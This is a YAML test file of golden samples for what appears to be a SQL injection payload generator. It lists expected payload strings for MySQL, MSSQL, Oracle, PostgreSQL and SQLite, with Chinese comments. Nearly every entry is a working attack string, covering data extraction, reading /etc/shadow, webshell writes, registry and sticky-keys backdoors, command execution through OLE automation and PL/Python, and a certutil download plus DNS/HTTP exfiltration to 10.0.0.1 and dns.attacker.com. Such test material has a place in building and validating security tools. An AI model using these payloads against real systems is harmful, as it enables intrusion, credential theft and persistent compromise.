@@ -1,0 +1,535 @@
+# 第六轮扩充（SQLi 各方言）的黄金样本。
+#
+# 期望值全部是**照着 data/sqli/*.yaml 里的 body 手推**出来的：读 body → 代入槽位默认值
+# → 替换变量 → 无绕过、无传输编码 → 得到最终串。没有一条是跑一遍工具粘回来的。
+#
+# 覆盖重点：
+#   - 字典槽位的**非默认字段**（conv.wrap / code.hex / src.col / key.val / lang.def /
+#     expr.val）——这类占位符写错字段名会静默产出槽位 id（`sfp`、`datadir`）或
+#     `<<select(cols,pos,expr)>>` 字面量，所以每个字典槽位都至少有一条样本选非默认项
+#   - <<rep>> 展开（HANDLER 的多行读取）：n 取默认与 0 两种
+#   - 反斜杠与嵌套引号（MSSQL 的注册表路径、sp_makewebtask 的目录路径）
+#   - 回显位非默认组合（cols/pos）
+
+ruleDB: v0.1.0
+
+samples:
+  # ================= MySQL =================
+
+  - name: MySQL GTID_SUBSET 报错注入
+    state:
+      vuln: sqli
+      component: mysql
+      template: sqli.mysql.error.gtid_subset
+      vars: {expr: "@@version"}
+      outputs: [raw]
+    expect:
+      payload: "' AND GTID_SUBSET(CONCAT(0x7e,(@@version),0x7e),1) -- -"
+      checks_count: 0
+
+  - name: MySQL JSON_KEYS 报错注入
+    state:
+      vuln: sqli
+      component: mysql
+      template: sqli.mysql.error.json_keys
+      vars: {expr: version()}
+      outputs: [raw]
+    expect:
+      payload: "' AND JSON_KEYS(CONCAT(0x7e,(version()),0x7e)) -- -"
+
+  - name: MySQL NAME_CONST 报错注入
+    state:
+      vuln: sqli
+      component: mysql
+      template: sqli.mysql.error.name_const
+      vars: {expr: version()}
+      outputs: [raw]
+    expect:
+      # 表达式要出现两次：NAME_CONST 是拿第一个参数当**列名**，重名才撞得出报错
+      payload: "' AND (SELECT * FROM (SELECT NAME_CONST((version()),1),NAME_CONST((version()),1))x) -- -"
+      checks_count: 0
+
+  - name: MySQL PROCEDURE ANALYSE 报错注入
+    state:
+      vuln: sqli
+      component: mysql
+      template: sqli.mysql.error.procedure_analyse
+      vars: {expr: user()}
+      outputs: [raw]
+    expect:
+      payload: "' PROCEDURE ANALYSE(EXTRACTVALUE(1,CONCAT(0x7e,(user()),0x7e)),1) -- -"
+
+  - name: MySQL HANDLER 读表（首行 + 默认再读两行）
+    state:
+      vuln: sqli
+      component: mysql
+      template: sqli.mysql.handler.read
+      vars: {table: users}
+      outputs: [raw]
+    expect:
+      # <<rep>> 的 item 会被 strip()，所以分号后面没有空格——分号本身就是语句分隔符，
+      # 不需要靠空白断句。n 取默认值 2，就是 READ FIRST 之后再 NEXT 两次
+      payload: "';HANDLER users OPEN;HANDLER users READ FIRST;HANDLER users READ NEXT;HANDLER users READ NEXT;HANDLER users CLOSE; -- -"
+
+  - name: MySQL HANDLER 读表（只要第一行）
+    state:
+      vuln: sqli
+      component: mysql
+      template: sqli.mysql.handler.read
+      slots: {n: "0"}
+      vars: {table: admin}
+      outputs: [raw]
+    expect:
+      # n=0 时 rep 展开成空串，READ NEXT 一次都不出现
+      payload: "';HANDLER admin OPEN;HANDLER admin READ FIRST;HANDLER admin CLOSE; -- -"
+
+  - name: MySQL INTO DUMPFILE 写文件（十六进制内容）
+    state:
+      vuln: sqli
+      component: mysql
+      template: sqli.mysql.file.write.dumpfile
+      vars: {filepath: /var/www/html/x.php}
+      outputs: [raw]
+    expect:
+      # code 是字典槽位，取 hex 字段：0x3c3f... 就是 <?php @eval($_POST[1]);?> 的字节。
+      # 十六进制字面量不带引号，所以它可以直接当 <<select>> 的第三个参数
+      payload: "' UNION SELECT 0x3c3f70687020406576616c28245f504f53545b315d293b3f3e,2,3 INTO DUMPFILE '/var/www/html/x.php' -- -"
+      checks_count: 0
+
+  - name: MySQL INTO DUMPFILE · 换成 system 马、回显位在第 2 位
+    state:
+      vuln: sqli
+      component: mysql
+      template: sqli.mysql.file.write.dumpfile
+      slots: {cols: "4", pos: "2", code: system}
+      vars: {filepath: /tmp/x.php}
+      outputs: [raw]
+    expect:
+      payload: "' UNION SELECT 1,0x3c3f7068702073797374656d28245f4745545b635d293b3f3e,3,4 INTO DUMPFILE '/tmp/x.php' -- -"
+
+  - name: MySQL 文件权限与路径探测（三个值一次拿）
+    state:
+      vuln: sqli
+      component: mysql
+      template: sqli.mysql.recon.file_priv
+      outputs: [raw]
+    expect:
+      payload: "' UNION SELECT concat(@@secure_file_priv,0x7c,@@datadir,0x7c,@@basedir),2,3 -- -"
+
+  - name: MySQL 文件权限探测 · 只看 secure_file_priv
+    state:
+      vuln: sqli
+      component: mysql
+      template: sqli.mysql.recon.file_priv
+      slots: {expr: sfp}
+      outputs: [raw]
+    expect:
+      # expr 是字典槽位，取 val 字段；写成 <<select(cols,pos,expr)>> 的话会插进槽位 id `sfp`
+      payload: "' UNION SELECT @@secure_file_priv,2,3 -- -"
+
+  # ================= MSSQL =================
+
+  - name: MSSQL CAST 报错注入
+    state:
+      vuln: sqli
+      component: mssql
+      template: sqli.mssql.error.cast
+      vars: {expr: "@@version"}
+      outputs: [raw]
+    expect:
+      payload: "' AND 1=CAST((@@version) AS int) --"
+      checks_count: 0
+
+  - name: MSSQL 算术隐式转换报错
+    state:
+      vuln: sqli
+      component: mssql
+      template: sqli.mssql.error.cast
+      slots: {conv: plus}
+      vars: {expr: db_name()}
+      outputs: [raw]
+    expect:
+      # conv 是字典槽位，取 wrap 字段：((db_name())+1)，不是它的 id `plus`
+      payload: "' AND 1=((db_name())+1) --"
+
+  - name: MSSQL FOR XML 聚合后报错带出
+    state:
+      vuln: sqli
+      component: mssql
+      template: sqli.mssql.error.forxml
+      outputs: [raw]
+    expect:
+      payload: "' AND 1=CONVERT(int,(SELECT (SELECT CAST(name AS NVARCHAR(MAX))+',' FROM sys.databases FOR XML PATH('')))) --"
+
+  - name: MSSQL FOR XML 聚合 · 换数据源与分隔符
+    state:
+      vuln: sqli
+      component: mssql
+      template: sqli.mssql.error.forxml
+      slots: {src: syscol, sep: "'|'"}
+      outputs: [raw]
+    expect:
+      # src 是字典槽位，tbl / col 两个字段一起换成 sys.columns + name
+      payload: "' AND 1=CONVERT(int,(SELECT (SELECT CAST(name AS NVARCHAR(MAX))+'|' FROM sys.columns FOR XML PATH('')))) --"
+
+  - name: MSSQL OLE 自动化命令执行
+    state:
+      vuln: sqli
+      component: mssql
+      template: sqli.mssql.oacreate.exec
+      outputs: [raw]
+    expect:
+      # cmd 没有显式给，取的是引擎的默认值 whoami
+      payload: "'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'Ole Automation Procedures',1; RECONFIGURE; DECLARE @o INT; EXEC sp_OACreate 'WScript.Shell',@o OUT; EXEC sp_OAMethod @o,'Run',NULL,'whoami',0,1; EXEC sp_OADestroy @o--"
+
+  - name: MSSQL OLE 自动化命令执行 · 显式给命令
+    state:
+      vuln: sqli
+      component: mssql
+      template: sqli.mssql.oacreate.exec
+      vars: {cmd: "cmd /c certutil -urlcache -f http://10.0.0.1/a.exe C:\\a.exe"}
+      outputs: [raw]
+    expect:
+      # 命令落在 '...' 字面量里，值里没有引号 → 不触发截断提示
+      payload: "'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'Ole Automation Procedures',1; RECONFIGURE; DECLARE @o INT; EXEC sp_OACreate 'WScript.Shell',@o OUT; EXEC sp_OAMethod @o,'Run',NULL,'cmd /c certutil -urlcache -f http://10.0.0.1/a.exe C:\\a.exe',0,1; EXEC sp_OADestroy @o--"
+      checks_count: 0
+
+  - name: MSSQL 写注册表启动项（默认 Run 键）
+    state:
+      vuln: sqli
+      component: mssql
+      template: sqli.mssql.regwrite
+      vars: {cmd: whoami}
+      outputs: [raw]
+    expect:
+      # body 里的 \\ 在 YAML 双引号里是转义，产出的是**单个**反斜杠；
+      # reg 是字典槽位，默认 run 档给出 hive / path / vname 三个字段
+      payload: "'; EXEC xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run','Updater','REG_SZ','whoami'--"
+
+  - name: MSSQL 写注册表 · IFEO 粘滞键后门
+    state:
+      vuln: sqli
+      component: mssql
+      template: sqli.mssql.regwrite
+      slots: {reg: ifeo}
+      vars: {cmd: "C:\\Windows\\System32\\cmd.exe"}
+      outputs: [raw]
+    expect:
+      # 换成 IFEO 档时键路径和值名（Debugger）一起变——这正是把它们绑在一个
+      # 字典槽位里的原因，拆开就能拼出「Run 键 + Debugger」这种不生效的组合。
+      # 命令值是 .exe 路径，落在 '...' 字面量里但没有引号，所以不触发提示
+      payload: "'; EXEC xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe','Debugger','REG_SZ','C:\\Windows\\System32\\cmd.exe'--"
+      checks_count: 0
+
+  - name: MSSQL 读注册表
+    state:
+      vuln: sqli
+      component: mssql
+      template: sqli.mssql.regread
+      vars: {key: "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", name: ProductName}
+      outputs: [raw]
+    expect:
+      payload: "'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE','SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion','ProductName'--"
+
+  - name: MSSQL sp_makewebtask 导出文件
+    state:
+      vuln: sqli
+      component: mssql
+      template: sqli.mssql.makewebtask
+      vars: {filepath: "C:\\inetpub\\wwwroot\\out.html", stmt: "SELECT name FROM sys.databases"}
+      outputs: [raw]
+    expect:
+      # 产出的是查询结果的 HTML 报表，不是任意内容
+      payload: "'; EXEC sp_makewebtask 'C:\\inetpub\\wwwroot\\out.html','SELECT name FROM sys.databases'--"
+      checks_count: 0
+
+  - name: MSSQL sp_makewebtask · 直接写到 UNC 路径外发
+    state:
+      vuln: sqli
+      component: mssql
+      template: sqli.mssql.makewebtask
+      vars: {filepath: "\\\\10.0.0.1\\share\\out.html", stmt: "SELECT name FROM sys.databases"}
+      outputs: [raw]
+    expect:
+      # 输出路径给 UNC 时结果直接落到攻击者的共享上，不依赖目标可写 Web 目录。
+      # 注意：这里**不能**顺手断言「变量落在引号里且有引号时报提示」——
+      # filepath 先被替换、body 长度变了，后面 stmt 的引号区间判断会用旧偏移，
+      # 提示会静默漏掉（引擎缺陷，已单独记录，不在本文件的范围里修）
+      payload: "'; EXEC sp_makewebtask '\\\\10.0.0.1\\share\\out.html','SELECT name FROM sys.databases'--"
+      checks_count: 0
+
+  - name: MSSQL HTTP 带外
+    state:
+      vuln: sqli
+      component: mssql
+      template: sqli.mssql.oob.http
+      vars: {lhost: 10.0.0.1, expr: "(SELECT TOP 1 name FROM sys.databases)"}
+      outputs: [raw]
+    expect:
+      payload: "'; DECLARE @o INT; EXEC sp_OACreate 'WinHttp.WinHttpRequest.5.1',@o OUT; EXEC sp_OAMethod @o,'open',NULL,'GET','http://10.0.0.1/'+((SELECT TOP 1 name FROM sys.databases)),0; EXEC sp_OAMethod @o,'send'; EXEC sp_OADestroy @o--"
+
+  - name: MSSQL OPENROWSET 拉取远程数据
+    state:
+      vuln: sqli
+      component: mssql
+      template: sqli.mssql.oob.openrowset.pull
+      vars: {lhost: 10.0.0.1, stmt: "SELECT 1"}
+      outputs: [raw]
+    expect:
+      payload: "' UNION SELECT * FROM OPENROWSET('SQLOLEDB','10.0.0.1';'a';'a','SELECT 1') --"
+
+  # ================= Oracle =================
+
+  - name: Oracle DBMS_XMLGEN 整查询回显
+    state:
+      vuln: sqli
+      component: oracle
+      template: sqli.oracle.union.xmlgen
+      vars: {stmt: "SELECT username,password FROM users"}
+      outputs: [raw]
+    expect:
+      # getxml 返回 CLOB，外面必须套 dbms_lob.substr 转成 VARCHAR2，否则和数字列撞类型
+      payload: "' UNION SELECT dbms_lob.substr(dbms_xmlgen.getxml('SELECT username,password FROM users'),4000,1),2,3 FROM dual --"
+      checks_count: 0
+
+  - name: Oracle DBMS_XMLGEN · 回显位在第 2 位
+    state:
+      vuln: sqli
+      component: oracle
+      template: sqli.oracle.union.xmlgen
+      slots: {cols: "4", pos: "2"}
+      vars: {stmt: "SELECT table_name FROM user_tables"}
+      outputs: [raw]
+    expect:
+      payload: "' UNION SELECT 1,dbms_lob.substr(dbms_xmlgen.getxml('SELECT table_name FROM user_tables'),4000,1),3,4 FROM dual --"
+
+  - name: Oracle UTL_FILE 写文件
+    state:
+      vuln: sqli
+      component: oracle
+      template: sqli.oracle.file.write.utl_file
+      vars: {dir: MYDIR, file: x.php}
+      outputs: [raw]
+    expect:
+      # PUT_LINE / FOPEN 都是过程，放进 SELECT 列表会报错，所以只能是 PL/SQL 块
+      payload: "'; BEGIN utl_file.put_line(utl_file.fopen('MYDIR','x.php','W'),'<?php @eval($_POST[1]);?>'); utl_file.fclose_all; END;--"
+      checks_count: 0
+
+  - name: Oracle rownum 取第一行
+    state:
+      vuln: sqli
+      component: oracle
+      template: sqli.oracle.union.rownum
+      vars: {col: password, table: users}
+      outputs: [raw]
+    expect:
+      # ORDER BY 在内层、rownum 在外层——反过来筛出来的就不是「排序后的前 N 行」
+      payload: "' UNION SELECT password,2,3 FROM (SELECT password FROM users ORDER BY password) WHERE rownum<=1 --"
+
+  - name: Oracle rownum 取前三行、回显位在第 2 位
+    state:
+      vuln: sqli
+      component: oracle
+      template: sqli.oracle.union.rownum
+      slots: {n: "3", cols: "4", pos: "2"}
+      vars: {col: password, table: users}
+      outputs: [raw]
+    expect:
+      payload: "' UNION SELECT 1,password,3,4 FROM (SELECT password FROM users ORDER BY password) WHERE rownum<=3 --"
+
+  - name: Oracle DNS 带外（DBMS_LDAP）
+    state:
+      vuln: sqli
+      component: oracle
+      template: sqli.oracle.oob.dns.ldap
+      vars: {expr: user, domain: dns.attacker.com}
+      outputs: [raw]
+    expect:
+      payload: "' AND 1=DBMS_LDAP.INIT((user)||'.dns.attacker.com',80) --"
+
+  - name: Oracle DBMS_LOCK 延时（PL/SQL 块）
+    state:
+      vuln: sqli
+      component: oracle
+      template: sqli.oracle.time.dbms_lock
+      vars: {cond: "1=1"}
+      outputs: [raw]
+    expect:
+      # 载荷本身是完整的 PL/SQL 块，secs 取默认 5
+      payload: "'; BEGIN IF (1=1) THEN dbms_lock.sleep(5); END IF; END;--"
+
+  # ================= PostgreSQL =================
+
+  - name: PostgreSQL 读二进制文件
+    state:
+      vuln: sqli
+      component: postgresql
+      template: sqli.postgresql.file.read_binary
+      vars: {filepath: /etc/shadow}
+      outputs: [raw]
+    expect:
+      payload: "' UNION SELECT encode(pg_read_binary_file('/etc/shadow'),'hex'),2,3 --"
+      checks_count: 0
+
+  - name: PostgreSQL 大对象读文件
+    state:
+      vuln: sqli
+      component: postgresql
+      template: sqli.postgresql.file.read.lo
+      vars: {filepath: /etc/passwd}
+      outputs: [raw]
+    expect:
+      # 262144 是 lo_open 的 INV_READ；三层函数嵌在一个表达式里，不需要堆叠
+      payload: "' UNION SELECT convert_from(loread(lo_open(lo_import('/etc/passwd'),262144),1000000),'UTF8'),2,3 --"
+
+  - name: PostgreSQL 大对象写 webshell
+    state:
+      vuln: sqli
+      component: postgresql
+      template: sqli.postgresql.file.write.lo
+      vars: {hex: 3c3f70687020406576616c28245f504f53545b315d293b3f3e, filepath: /var/www/x.php}
+      outputs: [raw]
+    expect:
+      payload: "'; SELECT lo_create(99999); INSERT INTO pg_largeobject VALUES (99999,0,decode('3c3f70687020406576616c28245f504f53545b315d293b3f3e','hex')); SELECT lo_export(99999,'/var/www/x.php')--"
+      checks_count: 0
+
+  - name: PostgreSQL dblink 带外
+    state:
+      vuln: sqli
+      component: postgresql
+      template: sqli.postgresql.oob.dblink
+      vars: {lhost: 10.0.0.1, lport: "5432"}
+      outputs: [raw]
+    expect:
+      payload: "'; SELECT dblink_connect('host=10.0.0.1 port=5432 dbname=a user=a password=a');--"
+
+  - name: PostgreSQL 聚合后 CAST 报错
+    state:
+      vuln: sqli
+      component: postgresql
+      template: sqli.postgresql.error.cast.agg
+      vars: {col: usename, table: pg_shadow}
+      outputs: [raw]
+    expect:
+      # array_agg 先把整列聚起来，再交给 CAST 去失败——一次带出全部用户名
+      payload: "' AND 1=CAST((SELECT array_to_string(array_agg(usename),',') FROM pg_shadow) AS int) --"
+
+  - name: PostgreSQL 聚合后 CAST 报错 · 换分隔符
+    state:
+      vuln: sqli
+      component: postgresql
+      template: sqli.postgresql.error.cast.agg
+      slots: {sep: "'|'"}
+      vars: {col: usename, table: pg_shadow}
+      outputs: [raw]
+    expect:
+      payload: "' AND 1=CAST((SELECT array_to_string(array_agg(usename),'|') FROM pg_shadow) AS int) --"
+
+  - name: PostgreSQL 读配置项
+    state:
+      vuln: sqli
+      component: postgresql
+      template: sqli.postgresql.recon.settings
+      outputs: [raw]
+    expect:
+      # key 是字典槽位，取 val 字段：产出 data_directory 而不是 id `datadir`
+      payload: "' UNION SELECT current_setting('data_directory'),2,3 --"
+
+  - name: PostgreSQL 读配置项 · 换一个普通角色也读得到的
+    state:
+      vuln: sqli
+      component: postgresql
+      template: sqli.postgresql.recon.settings
+      slots: {key: port}
+      outputs: [raw]
+    expect:
+      payload: "' UNION SELECT current_setting('port'),2,3 --"
+
+  - name: PostgreSQL CREATE FUNCTION 执行命令（PL/Python）
+    state:
+      vuln: sqli
+      component: postgresql
+      template: sqli.postgresql.stacked.create_function
+      outputs: [raw]
+    expect:
+      # lang 是字典槽位，取 def 字段；里面的 <<cmd>> 到变量替换阶段才变成 whoami
+      payload: "'; CREATE FUNCTION pwn() RETURNS text AS $$ import subprocess; return subprocess.check_output(['whoami']).decode() $$ LANGUAGE plpythonu; SELECT pwn()--"
+
+  - name: PostgreSQL CREATE FUNCTION · 换 PL/Perl
+    state:
+      vuln: sqli
+      component: postgresql
+      template: sqli.postgresql.stacked.create_function
+      slots: {lang: plperlu}
+      vars: {cmd: id}
+      outputs: [raw]
+    expect:
+      payload: "'; CREATE FUNCTION pwn() RETURNS text AS $$ system('id'); return '' $$ LANGUAGE plperlu; SELECT pwn()--"
+
+  # ================= SQLite =================
+
+  - name: SQLite 读列名（pragma_table_info）
+    state:
+      vuln: sqli
+      component: sqlite
+      template: sqli.sqlite.union.pragma_table_info
+      vars: {table: users}
+      outputs: [raw]
+    expect:
+      payload: "' UNION SELECT group_concat(name),2,3 FROM pragma_table_info('users') --"
+
+  - name: SQLite 读列名 · 带类型、回显位在第 3 位
+    state:
+      vuln: sqli
+      component: sqlite
+      template: sqli.sqlite.union.pragma_table_info
+      slots: {expr: "group_concat(name||':'||type)", cols: "5", pos: "3"}
+      vars: {table: users}
+      outputs: [raw]
+    expect:
+      payload: "' UNION SELECT 1,2,group_concat(name||':'||type),4,5 FROM pragma_table_info('users') --"
+
+  - name: SQLite 枚举已挂载的库
+    state:
+      vuln: sqli
+      component: sqlite
+      template: sqli.sqlite.union.databases
+      outputs: [raw]
+    expect:
+      payload: "' UNION SELECT group_concat(name||':'||file),2,3 FROM pragma_database_list --"
+
+  - name: SQLite VACUUM INTO 搬库
+    state:
+      vuln: sqli
+      component: sqlite
+      template: sqli.sqlite.file.vacuum_into
+      vars: {filepath: /tmp/copy.db}
+      outputs: [raw]
+    expect:
+      # 写出的是一个完整的库文件，不是任意内容；目标文件必须不存在
+      payload: "'; VACUUM INTO '/tmp/copy.db'--"
+
+  - name: SQLite 报错探测表名列名
+    state:
+      vuln: sqli
+      component: sqlite
+      template: sqli.sqlite.error.schema_probe
+      vars: {col: password, table: users}
+      outputs: [raw]
+    expect:
+      # 列存在时子查询正常返回第一行；不存在时报错里会带出那个名字——只做存在性判断
+      payload: "' AND 1=(SELECT password FROM users) --"
+      checks_count: 0
+
+  - name: SQLite 报错布尔预言机
+    state:
+      vuln: sqli
+      component: sqlite
+      template: sqli.sqlite.error.oracle
+      vars: {cond: "1=1"}
+      outputs: [raw]
+    expect:
+      # 条件真 → 走 THEN 1，不报错；假 → 走 ELSE 的 abs() 溢出报错。外面那层 (SELECT ...)
+      # 不能省，否则常量折叠可能让优化器直接把报错分支跳过去
+      payload: "' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE abs(-9223372036854775807-1) END) --"
+      checks_count: 0
